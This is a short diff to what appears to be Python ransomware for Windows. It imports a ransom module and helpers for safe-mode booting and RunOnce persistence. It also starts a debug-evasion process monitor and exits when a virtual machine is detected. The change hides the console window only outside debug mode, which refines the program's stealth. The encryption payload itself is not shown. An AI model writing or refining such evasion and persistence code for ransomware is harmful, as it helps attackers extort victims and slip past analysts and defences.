@@ -15,7 +15,7 @@ from Encryption.Utils import is_secure_boot,enable_safemode,addRun_once
 from Encryption.Ransom import example_ransom
 SW_HIDE = 0
 hWnd = windll.kernel32.GetConsoleWindow()
-windll.user32.ShowWindow(hWnd,SW_HIDE)
+
 def main():
     Thread(target=debugEvasion.process_monitor,args=()).start()
     if is_secure_boot(): #the function is not recognizing secure boot!
@@ -27,6 +27,8 @@ def main():
                 debug = True
         except Exception as e:
             pass
+    if not debug:
+        windll.user32.ShowWindow(hWnd, SW_HIDE)
     vm_flag = sys.exit if not debug else lambda x: print(x)
     prevent_sleep()
     if not debug :
